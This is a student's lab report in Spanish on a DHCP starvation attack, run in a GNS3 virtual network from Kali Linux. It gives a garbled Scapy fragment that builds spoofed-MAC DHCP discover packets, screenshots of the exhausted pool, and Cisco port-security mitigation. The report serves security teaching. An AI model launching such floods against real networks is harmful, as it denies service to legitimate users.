# Ataque-Dhcp_Starvation

**Estudiante:** Masucci Franco Rincón  
**Matrícula:** 2024-1250  
**Asignatura:** Seguridad de Redes  
**Fecha:** 13/02/2026  

**Link del video:*https://itlaedudo-my.sharepoint.com/:v:/g/personal/20241250_itla_edu_do/IQDqDMBW5A-eQalVSdPDmZXAASxAv5qU3oMLhEoZbmFfHGw*

---

### Descripción y Topología 

El laboratorio se ha desplegado en un entorno virtualizado utilizando **GNS3**, simulando una infraestructura de red corporativa vulnerada desde el interior.

### Detalles de la Topología

<img width="521" height="302" alt="image" src="https://github.com/user-attachments/assets/973f36d1-6b4f-43d8-b383-4c296712c79b" />


* **Direccionamiento IP:** Subred `10.12.50.0/24`.

* **Segmento de Red:** `10.12.50.0/24`
* **Gateway (Víctima DoS):** Router Cisco (`10.12.50.1`)
* **Atacante:** Kali Linux (`eth0`)

| Dispositivo | Rol | Estado Inicial |
| :--- | :--- | :--- |
| **Router Gateway** | Servidor DHCP | Pool activo (254 IPs libres) |
| **Switch L2** | Infraestructura | Sin seguridad |
| **Kali Linux** | Atacante | Generador de tráfico |
| **Vpcs** | Victima | solicitante |


### Objetivo del Script
Demostrar la vulnerabilidad de un servidor DHCP que no cuenta con mecanismos de validación de identidad (como Port Security). El objetivo es denegar el servicio a nuevos clientes legítimos impidiendo que obtengan una dirección IP.



### Parámetros Usados
El script utiliza la librería **Scapy** para la inyección de paquetes en capa 2/3.

* **Interfaz de Inyección:** `eth0`
* **Generación de MAC:** Función `RandMAC()` para aleatoriedad criptográfica.
* **Estructura del Paquete:**
  
            conf.checkIPaddr = False
            fake_mac = RandMAC()
            xid_random = random.randint(1, 900000000)
            src = fake_mac                    
            dst = "ff:ff:ff:ff:ff:ff"        
            src = "0.0.0.0"                
            dst = "255.255.255.255"          
            sport = 68                       
            dport = 67                        
            chaddr = fake_mac                 
            xid = xid_random
              
            options = [
                ("message-type", "discover"),  
                "end"                         
            ]
  
            pkt = pkt                        
            iface = "eth0"                   
            verbose = 0
  
                     

## Evidencias de Ejecución
## 1- Agotando las Ips en el pool de dhcp 
<img width="890" height="404" alt="image" src="https://github.com/user-attachments/assets/86fb7352-0354-4177-988e-f8099528b6fe" />


## 2- Fallo de asignacion de Ip a la maquina victima
<img width="960" height="368" alt="image" src="https://github.com/user-attachments/assets/29ab0df0-eaca-41c1-9753-c64aa12d5967" />




---

### Requisitos para utilizar la herramienta.
Tener python3 instalado en la maquina atacante


### Medidas de Mitigación
Para prevenir este ataque, se debe configurar **Port Security** en los switches de acceso para limitar el número de direcciones MAC permitidas por puerto.

```bash
interface range e0/x-x
switchport port-security
switchport port-security maximum 2
switchport port-security violation restrict
